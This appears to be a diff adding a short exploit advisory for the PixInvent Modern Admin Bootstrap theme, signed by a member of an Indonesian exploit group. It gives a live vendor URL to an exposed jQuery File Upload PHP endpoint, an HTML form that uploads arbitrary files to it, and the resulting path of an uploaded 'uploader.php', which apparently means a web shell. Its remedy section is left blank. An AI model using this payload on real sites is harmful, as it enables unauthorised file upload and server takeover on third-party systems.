@@ -1,0 +1,24 @@
+Title: PIXINVENT MODERN THEMES JQUERY FILE UPLOAD WITH CSRF
+Author: William Laurent
+Vendor Homepage: 
+1. https://themeforest.net/item/modern-admin-clean-bootstrap-4-dashboard-html-template/21430660
+2. https://pixinvent.com/modern-admin-clean-bootstrap-4-dashboard-html-template/html/ltr/vertical-modern-menu-template/
+
+PRICE THEMES/ HARGA TEMA: 24$ / IDR 339300, The price is expensive but the shortcomings
+are provided upload places that can be accessed by third parties.
+
+Full Path Exploit: 
+https://pixinvent.com/modern-admin-clean-bootstrap-4-dashboard-html-template/app-assets/data/jquery-file-upload/server/php/
+
+CSRF:
+<form method="POST" action="http://localhost/app-assets/data/jquery-file-upload/server/php/"
+enctype="multipart/form-data">
+<input type="file" name="files[]"/><button>Upload</button>
+</form>
+
+Files Path: "/app-assets/data/jquery-file-upload/server/php/files/uploader.php"
+
+SOLUTION: 
+
+Thanks to: L4663r666h05t - Indonesian Code Party - Exploiter.ID
+Need me? williamlaurent@exploiter.id
